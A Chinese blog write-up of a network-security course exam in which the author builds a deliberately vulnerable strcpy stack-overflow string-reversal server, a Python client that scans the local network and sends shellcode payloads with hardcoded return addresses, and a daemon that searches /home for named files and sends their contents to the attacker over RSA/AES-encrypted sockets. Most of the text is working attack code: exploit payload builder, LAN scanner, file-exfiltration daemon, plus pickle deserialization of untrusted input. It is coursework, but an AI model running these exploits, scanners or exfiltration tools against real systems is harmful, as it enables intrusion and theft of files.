<li>对寄存器进行操作时出现操作数和寄存器的大小不一，出现<code>00</code>字节<ul>
<li>解决方法：<code>eax 32bit</code>  <code>ax 16bit</code>  <code>ah al 8bit</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="任务一-字符串前后翻转服务端程序"><a href="#任务一-字符串前后翻转服务端程序" class="headerlink" title="任务一 字符串前后翻转服务端程序"></a>任务一 字符串前后翻转服务端程序</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
<blockquote>
<p>由于栈溢出的漏洞已经调过很多种类了：字符串复制栈溢出、整数栈溢出、格式化字符串栈溢出、堆溢出等等</p>
<p>而这次的实验，我觉得重点不在于漏洞的复杂性，所以索性编写了strcpy()函数栈溢出漏洞。</p>
</blockquote>
<p>string前后翻转服务端程序，我使用c语言编写简单的sokcet服务，将客户端发来的字符串翻转之后回送。</p>
<h2 id="1-1-漏洞原理"><a href="#1-1-漏洞原理" class="headerlink" title="1.1 漏洞原理"></a>1.1 漏洞原理</h2><p>缓冲区溢出漏洞在于处理字符串时<strong>main()-&gt;reverse()-&gt;foo()-&gt;strcpy()</strong>中，由于<code>strcpy()</code>在复制字符串时并未检查字符串的长度，使输入内容可以超过bufferA的空间，从而实现栈溢出，覆盖返回地址，跳到我们填入的shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了实现攻击，我们构造输入str，使其超出bufferA的部分恰好覆盖ebp的值和foo函数的栈返回ret，使该ret内容指向我们的shellcode，然后在foo返回之后即顺势跳到我们的shellcode，劫持成功。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221417113-1593172509344.png" alt="image-20200621221417113"></p>
<p>如下为调试图</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221754210-1593172509345.png" alt="image-20200621221754210"></p>
<p>从图上可以看到，ebp位于<code>bufferA+108</code>（我把GS关了），而<code>bufferA只有100字节</code>，很奇怪</p>
<p>回头看了之前project1栈溢出实验中6个vul中的foo函数，他们都是foo函数中创建了buffer，然后调用一个漏洞函数来执行的，大概的格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//5个栈溢出vul的基本格式</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">200</span>]; <span class="comment">//&lt;---在foo函数中只创建了一个局部变量，就call了下一个函数</span></span><br><span class="line">    nstrcpy(buf, <span class="keyword">sizeof</span> buf, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我写的漏洞函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到：<code>在foo函数中只创建了一个局部变量，就call了下一个函数</code></p>
<p>而我的函数也是这种格式，却产生了<code>bufferA只有100字节，ebp却位于bufferA+108</code>问题，这里表示疑惑，毕竟我所有的安全机制都关了。总而言之，不知道这8个字节意义是什么，但是却不影响我们溢出，所以暂且不管了。</p>
<blockquote>
<p>（RELRO：RELRO会有<strong>Partial RELRO</strong>和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表）</p>
</blockquote>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622164819499.png" alt="image-20200622164819499"></p>
<p>为了溢出，我们的shellcode可以如下拼接。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于拼接字符串demon,具体的拼接函数可以选择三个shellcode进行拼接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    payload = shellcode + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode)) <span class="comment">#shellcode以及nop</span></span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span> <span class="comment">#109字节处开始写ebp，ret</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span>  <span class="comment">#payload结束</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>下图为<code>装载了创建文件的shellcode的payload</code>调试成功，成功创建<code>LinFengLv.txt</code></p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221839431-1593172509345.png" alt="image-20200621221839431"></p>
<h2 id="1-2-收发数据"><a href="#1-2-收发数据" class="headerlink" title="1.2 收发数据"></a>1.2 收发数据</h2><p>逆转字符串程序主要在reverse()中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="comment">//strncpy(buf,str,strlen(str));</span></span><br><span class="line">	<span class="comment">//assert(str);</span></span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">	<span class="comment">//主要的收发业务部分</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">        <span class="comment">//处理业务</span></span><br><span class="line">		reverse(buf);</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="任务二、恶意客户端程序"><a href="#任务二、恶意客户端程序" class="headerlink" title="任务二、恶意客户端程序"></a>任务二、恶意客户端程序</h1><p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
<h2 id="2-1-扫描找到有该漏洞的服务端机器"><a href="#2-1-扫描找到有该漏洞的服务端机器" class="headerlink" title="2.1 扫描找到有该漏洞的服务端机器"></a>2.1 扫描找到有该漏洞的服务端机器</h2><p>主要是</p>
<ul>
<li>通过socket尝试连接<code>&#39;8.8.8.8&#39;</code>（任意），<code>socket.getsockname()[0]</code>获得本机的局域网ip</li>
<li>通过本机ip计算出所有局域网的ip</li>
<li>尝试socket连接局域网的ip的服务端端口（这里是8000），找出有运行服务端程序的机器</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">port_list = [<span class="string">"8000"</span>] <span class="comment">#默认扫描8000</span></span><br><span class="line">routers = [] <span class="comment">#扫描出的ip和端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机局域网ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义扫描函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket访问IP函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    启动扫描程序</span><br><span class="line">    ports=input(<span class="string">"输入想要扫描的端口"</span>)</span><br><span class="line">    port_list = port_list.append(ports.split(<span class="string">' '</span>))</span><br><span class="line">    print(port_list)</span><br><span class="line">    search_routers()</span><br></pre></td></tr></table></figure>

<h2 id="2-2-正常通信——字符串前后翻转"><a href="#2-2-正常通信——字符串前后翻转" class="headerlink" title="2.2 正常通信——字符串前后翻转"></a>2.2 正常通信——字符串前后翻转</h2><p>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>): </span><br><span class="line">    input_data = input(<span class="string">"send:"</span>) <span class="comment">#输入要发送的字符串</span></span><br><span class="line">    <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:   <span class="comment">#quit退出socket连接</span></span><br><span class="line">        input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">        clientsocket.send(input_data)  <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))<span class="comment"># 这里要发字节流</span></span><br><span class="line">    data = clientsocket.recv(<span class="number">1024</span>)  <span class="comment">#收到的翻转字符串</span></span><br><span class="line">    print(<span class="string">"recv:"</span>, data)</span><br></pre></td></tr></table></figure>

<h2 id="2-3-exploit功能"><a href="#2-3-exploit功能" class="headerlink" title="2.3 exploit功能"></a>2.3 exploit功能</h2><p>发送针对漏洞的payload（包含shellcode）</p>
<p>shellcode的字节代码已经在全局变量写了，程序通过对我们输入的判断（1234等）来判断我们要用哪种模式。</p>
<p>工作模式有【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出），其中1~3是exploit攻击，其他的则是正常通信。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621223352350.png" alt="image-20200621223352350"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通信主体函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发字节流形式</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<h1 id="任务三、daemon程序"><a href="#任务三、daemon程序" class="headerlink" title="任务三、daemon程序"></a>任务三、daemon程序</h1><p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
<p>程序 daemon，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</p>
<h2 id="3-1-搜索服务器上的任意指定文件"><a href="#3-1-搜索服务器上的任意指定文件" class="headerlink" title="3.1 搜索服务器上的任意指定文件"></a>3.1 搜索服务器上的任意指定文件</h2><p>如下代码所示，其可以在指定的目录下，搜索我们指定文件名的文件，并且将其路径保存在routes中。</p>
<p>主要是使用了pythond的os库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">routes=[] <span class="comment">#路径数组</span></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br></pre></td></tr></table></figure>

<h2 id="3-2-利用网络传送指定文件给客户端"><a href="#3-2-利用网络传送指定文件给客户端" class="headerlink" title="3.2 利用网络传送指定文件给客户端"></a>3.2 利用网络传送指定文件给客户端</h2><p>如下代码所示，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#根据恶意客户端的要求，做出应答（如搜索发送文件）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span> </span><br><span class="line">    recvData=json.loads(recvData) <span class="comment">#将恶意客户端发送来的数据json格式化</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>: <span class="comment">#如果是方式Method是get_file，就要搜索发送文件</span></span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>]) </span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>]) <span class="comment">#搜索指定的文件</span></span><br><span class="line">        print(routes) <span class="comment">#打印找到的路径</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span> <span class="comment">#返回指定的文件名和内容</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file，则发hello</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br></pre></td></tr></table></figure>



<h1 id="任务四、密钥管理机制和传输加密方案"><a href="#任务四、密钥管理机制和传输加密方案" class="headerlink" title="任务四、密钥管理机制和传输加密方案"></a>任务四、密钥管理机制和传输加密方案</h1><p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
<h2 id="4-1-密钥管理机制和传输加密方案"><a href="#4-1-密钥管理机制和传输加密方案" class="headerlink" title="4.1 密钥管理机制和传输加密方案"></a>4.1 密钥管理机制和传输加密方案</h2><p>客户端发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信</p>
<ul>
<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
</li>
<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
</li>
<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
</li>
<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
</li>
</ul>
<h3 id="客户端（攻击方）代码"><a href="#客户端（攻击方）代码" class="headerlink" title="客户端（攻击方）代码"></a>客户端（攻击方）代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="comment"># ===========向服务端（daemon）发RSA的公钥及其SHA256摘要=================</span></span><br><span class="line"><span class="comment"># 向服务端传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">   <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">   print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">   sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">   sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">   clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line">   <span class="comment"># ===========接受服务端传递的AES对称密钥，并验证是否被改动，解密==============</span></span><br><span class="line">   <span class="comment"># 接受服务端传递的密钥并进行解密</span></span><br><span class="line">   symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">   <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">       <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">       print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line">   <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">   AES = Fernet(self.symKey)</span><br><span class="line">   <span class="comment"># =====================AES密钥接收成功，下面是业务代码================</span></span><br></pre></td></tr></table></figure>

<h3 id="服务端（daemon）代码"><a href="#服务端（daemon）代码" class="headerlink" title="服务端（daemon）代码"></a>服务端（daemon）代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">       clientSocket, addr = self.serverSocket.accept() <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">       print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))<span class="comment"># 打印</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment"># ===========接收客户端发来的RSA公钥，并验证是否被改动=================</span></span><br><span class="line">       <span class="comment"># 接受客户端传递的公钥,哈希函数检验公钥的正确性,运用pickle进行反序列化</span></span><br><span class="line">       publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">       <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">           <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">           print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">       <span class="comment"># ===========下面是用RSA公钥加密AES对称密钥，发送密文及其SHA256摘要的过程=======</span></span><br><span class="line">       <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">       sym_key = Fernet.generate_key()</span><br><span class="line">       <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">       <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">       en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">       en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">       print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">       clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">       <span class="comment"># =====================AES密钥发送成功，下面是业务代码================</span></span><br><span class="line">       print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">       <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">       AES = Fernet(sym_key)</span><br><span class="line">       <span class="comment"># 下面使用AES对称密钥进行加密对话的过程</span></span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           time.sleep(<span class="number">0.3</span>)</span><br><span class="line">           recvData = clientSocket.recv(<span class="number">1024</span>) <span class="comment"># 接收到的消息</span></span><br><span class="line"></span><br><span class="line">           <span class="comment"># ============接收解密=================</span></span><br><span class="line">           recvData = AES.decrypt(recvData).decode()  <span class="comment">#接收解密</span></span><br><span class="line">           <span class="comment"># ================不解密=================</span></span><br><span class="line">           <span class="comment">#recvData = recvData.decode()</span></span><br><span class="line"></span><br><span class="line">           print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">           sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">           </span><br><span class="line">           <span class="comment"># ============加密发送=================</span></span><br><span class="line">            sendData = AES.encrypt(sendData.encode())<span class="comment"># 对消息进行加密</span></span><br><span class="line">            clientSocket.send(sendData)</span><br><span class="line">           <span class="comment"># ===============不加密=================</span></span><br><span class="line">           <span class="comment">#clientSocket.send(sendData.encode())</span></span><br></pre></td></tr></table></figure>

<h2 id="4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别"><a href="#4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别" class="headerlink" title="4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别"></a>4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</h2><p>首先我们先把daemon.py和client.py的加密关掉，启动后client向daemon请求LinFengLv.txt。</p>
<p>可以看到如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到<strong>传输内容明文</strong></p>
